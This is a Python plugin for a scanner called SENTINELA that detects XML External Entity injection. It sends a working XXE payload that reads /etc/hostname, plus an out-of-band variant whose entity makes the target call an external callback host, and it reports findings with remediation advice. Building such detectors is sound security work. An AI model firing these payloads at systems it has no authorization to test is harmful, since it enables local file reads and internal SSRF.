#!/usr/bin/env python3
"""
Plugin SENTINELA — Testador de XXE (XML External Entity)
Criado por github.com/3rr0rrr

Testa endpoints que aceitam XML (formulários com action terminando em
padrões conhecidos de API XML/SOAP, ou detectados via Content-Type) com um
payload XXE clássico apontando pra um arquivo local INOFENSIVO
(/etc/hostname — nunca /etc/shadow ou similar). Se o conteúdo do arquivo
aparecer refletido na resposta, é prova direta de XXE. Se não houver
reflexão E houver um OOB listener disponível em context["oob_listener"]
(modules/oob_listener.py), também tenta um payload apontando pra URL de
callback — se o alvo interagir com o callback, é confirmação definitiva de
XXE cego (SSRF via entidade externa).

Não roda em --mode stealth. Requisições limitadas.
"""

import time

from plugins.base import SentinelaPlugin

try:
    import requests
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


PAYLOAD_XXE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY sentinela_xxe SYSTEM "file:///etc/hostname">
]>
<root>&sentinela_xxe;</root>"""

CANDIDATOS_XML = ["xml", "soap", "wsdl", "rss", "feed", "sitemap", "api"]
MAX_ALVOS = 6


class XXETesterPlugin(SentinelaPlugin):
    name           = "Testador de XXE"
    version        = "1.0.0"
    author         = "github.com/3rr0rrr"
    description    = "Detecta XML External Entity Injection com leitura de arquivo local inofensivo"
    requires       = ["web_analysis"]
    tags           = ["web", "xxe", "injection"]
    severity       = "critical"
    enabled        = True
    stealth        = False
    min_confidence = 0.5
    max_findings   = 10
    timeout        = 45

    def run(self, target: str, context: dict) -> list:
        if not HAS_REQUESTS:
            return []

        config = context.get("config", {}) or {}
        if config.get("intensity") == "passive":
            return []

        session = self._build_session(config)
        findings = []

        alvos = self._coletar_alvos(context)
        for url in alvos[:MAX_ALVOS]:
            for content_type in ("application/xml", "text/xml"):
                try:
                    resp = session.post(
                        url, data=PAYLOAD_XXE,
                        headers={"Content-Type": content_type},
                        timeout=config.get("timeout", 10), verify=False,
                    )
                except Exception:
                    continue

                corpo = resp.text or ""
                # /etc/hostname normalmente é uma linha curta só com o nome da máquina
                refletido = self._parece_conteudo_hostname(corpo)

                if refletido:
                    f = self.finding(
                        severity         = "critical",
                        title            = f"XXE confirmado em {url}",
                        detail           = "O servidor processou a entidade externa e refletiu o conteúdo "
                                            "de /etc/hostname na resposta — leitura arbitrária de arquivo local confirmada.",
                        url              = url,
                        evidence         = corpo[:200],
                        remediation      = "Desabilitar resolução de entidades externas e DTD no parser XML "
                                            "(ex: defusedxml em Python, disable-external-entities em libxml2/lxml).",
                        confidence       = 0.9,
                        impact           = 9.5,
                        exploitability   = "pre-auth",
                        business_context = "XXE confirmado permite leitura de arquivos sensíveis do servidor "
                                            "(configs, chaves, código-fonte) e pode escalar pra SSRF interno.",
                    )
                    if f:
                        findings.append(f)
                    break
                elif resp.status_code >= 500 or "entit" in corpo.lower() or "dtd" in corpo.lower():
                    f = self.finding(
                        severity         = "medium",
                        title            = f"Possível XXE cego em {url}",
                        detail           = "O endpoint aceita XML com DOCTYPE/ENTITY sem rejeitar explicitamente, "
                                            "e a resposta mudou de comportamento (erro 5xx ou menção a entidade/DTD), "
                                            "mas não houve reflexão direta de conteúdo. Requer validação manual "
                                            "(ex: com um listener OOB) pra confirmar exploração.",
                        url              = url,
                        evidence         = f"HTTP {resp.status_code}",
                        remediation      = "Desabilitar resolução de entidades externas e DTD no parser XML.",
                        confidence       = 0.5,
                        impact           = 8.0,
                        exploitability   = "requer-confirmacao",
                        business_context = "XXE cego ainda pode ser usado pra SSRF interno mesmo sem reflexão direta.",
                    )
                    if f:
                        findings.append(f)

        # Confirmação de XXE cego via OOB (Interactsh), se disponível —
        # só roda pros alvos que não confirmaram XXE direto acima.
        oob = context.get("oob_listener")
        if oob and getattr(oob, "disponivel", False):
            findings += self._testar_via_oob(session, alvos, config, oob)

        return findings

    def _testar_via_oob(self, session, alvos: list, config: dict, oob) -> list:
        tags_por_url = {}
        for url in alvos[:MAX_ALVOS]:
            callback_url = oob.gerar_payload_url(f"xxe:{url}")
            if not callback_url:
                continue
            payload_oob = (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<!DOCTYPE root [\n'
                f'  <!ENTITY sentinela_oob SYSTEM "{callback_url}">\n'
                ']>\n<root>&sentinela_oob;</root>'
            )
            try:
                session.post(url, data=payload_oob,
                              headers={"Content-Type": "application/xml"},
                              timeout=config.get("timeout", 10), verify=False)
                tags_por_url[f"xxe:{url}"] = url
            except Exception:
                continue

        if not tags_por_url:
            return []

        time.sleep(6)  # dá tempo pro alvo processar e o callback chegar
        interacoes = oob.checar_interacoes()

        findings = []
        for inter in interacoes:
            url = tags_por_url.get(inter.get("tag"))
            if not url:
                continue
            f = self.finding(
                severity         = "critical",
                title            = f"XXE cego CONFIRMADO via OOB em {url}",
                detail           = f"O servidor fez uma requisição de callback ({inter.get('tipo')}) pro "
                                    f"listener Interactsh após receber o payload XXE — prova conclusiva de "
                                    f"processamento da entidade externa, mesmo sem reflexão direta na resposta HTTP.",
                url              = url,
                evidence         = f"callback recebido de {inter.get('origem')}, protocolo {inter.get('tipo')}",
                remediation      = "Desabilitar resolução de entidades externas e DTD no parser XML.",
                confidence       = 0.97,
                impact           = 9.7,
                exploitability   = "pre-auth",
                business_context = "XXE cego confirmado por OOB é tão grave quanto XXE com reflexão direta — "
                                    "permite SSRF interno e potencial leitura de arquivo via técnicas fora do "
                                    "escopo deste plugin (ex: exfiltração via DTD externo parametrizado).",
            )
            if f:
                findings.append(f)
        return findings

    def _coletar_alvos(self, context: dict) -> list:
        alvos = []
        for form in (context.get("forms") or []):
            action = form.get("action", "")
            if any(k in action.lower() for k in CANDIDATOS_XML):
                alvos.append(action)
        for ep in (context.get("endpoints") or []):
            if any(k in ep.lower() for k in CANDIDATOS_XML):
                alvos.append(ep)
        # dedup preservando ordem
        vistos, unicos = set(), []
        for u in alvos:
            if u not in vistos:
                vistos.add(u)
                unicos.append(u)
        return unicos

    def _parece_conteudo_hostname(self, corpo: str) -> bool:
        linhas = [l.strip() for l in corpo.split("\n") if l.strip()]
        for linha in linhas:
            # hostname típico: uma palavra curta, sem espaço, sem tag XML/HTML
            if 1 <= len(linha) <= 64 and " " not in linha and "<" not in linha and ">" not in linha:
                if any(c.isalnum() for c in linha) and linha not in ("root",):
                    return True
        return False

    def _build_session(self, config: dict):
        session = requests.Session()
        session.headers.update({
            "User-Agent": config.get("user_agent",
                "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"),
        })
        if config.get("headers"):
            session.headers.update(config["headers"])
        if config.get("cookies"):
            session.cookies.update(config["cookies"])
        if config.get("proxy"):
            session.proxies.update(config["proxy"])
        return session
